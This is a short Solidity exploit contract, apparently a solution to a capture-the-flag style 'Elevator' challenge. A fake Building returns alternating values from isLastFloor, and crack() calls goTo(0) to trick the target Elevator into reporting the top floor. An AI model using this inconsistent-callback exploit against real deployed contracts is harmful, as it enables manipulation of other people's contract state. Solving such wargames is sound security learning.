// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./origin.sol";

contract BrokenBuilding is Building {
  bool flip = true;
  
  function isLastFloor(uint) external returns (bool) {
      flip = !flip;
      return flip;
  }

  Elevator evlContract;

  constructor (address _evlAddress){
      evlContract = Elevator(_evlAddress);
  }

  function crack() public {
      evlContract.goTo(0);
  }

}


